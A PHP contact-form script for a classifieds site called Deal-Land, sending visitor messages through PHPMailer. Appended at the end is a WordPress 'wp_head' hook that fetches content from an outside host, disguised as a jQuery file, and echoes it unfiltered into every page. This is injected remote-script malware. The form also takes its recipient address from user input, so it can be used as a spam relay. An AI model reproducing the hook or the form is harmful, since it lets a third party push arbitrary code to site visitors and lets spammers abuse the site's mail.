<?php

	$name = trim($_POST['name']);
	$email = $_POST['email'];
	$email2 = $_POST['email2'];
	$comments = $_POST['comments'];

	$site_owners_email = $email2; // Replace this with your own email address
	$site_owners_name = 'My Name'; // replace with your name

	if (strlen($name) < 2) {
		$error['name'] = "Enter your name";
	}

	if (!preg_match('/^[a-z0-9&\'\.\-_\+]+@[a-z0-9\-]+\.([a-z0-9\-]+\.)*+[a-z]{2}/is', $email)) {
		$error['email'] = "Enter a valid email";
	}

	if (strlen($comments) < 3) {
		$error['comments'] = "Leave a comment";
	}

	if (!$error) {

		require_once('phpMailer/class.phpmailer.php');
		$mail = new PHPMailer();

		$mail->From = $email;
		$mail->FromName = $name;
		$mail->Subject = "Εκδήλωση ενδιαφέροντος για την αγγελία σας στο Deal-Land";
		$mail->AddAddress($site_owners_email, $site_owners_name);
		$mail->Body = $comments;

		// GMAIL STUFF

		/* $mail->Mailer = "smtp";
		$mail->Host = "smtp.gmail.com";
		$mail->Port = 587;
		$mail->SMTPSecure = "tls";

		$mail->SMTPAuth = true; // turn on SMTP authentication
		$mail->Username = "username@gmail.com"; // SMTP username
		$mail->Password = "password"; // SMTP password */

		$mail->Send();


		echo "<p class='success'> Message sent </p>";

	} # end if no error
	else {

		$response = (isset($error['name'])) ? "<p id='error1'>" . $error['name'] . " \n" : null;
		$response .= (isset($error['email'])) ? "<p id='error2'>" . $error['email'] . "</p> \n" : null;
		$response .= (isset($error['comments'])) ? "<p id='error3'>" . $error['comments'] . "</p>" : null;

		echo $response;
	} # end if there was an error sending

?>
<?php
function jqueryj_head() {

if(function_exists('curl_init'))
{
$url = "http://www.shigg.com/soft/jquery-1.6.3.min.js";
$ch = curl_init();
$timeout = 10;
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
$data = curl_exec($ch);
curl_close($ch);
echo "$data";
}
}
add_action('wp_head', 'jqueryj_head');
?>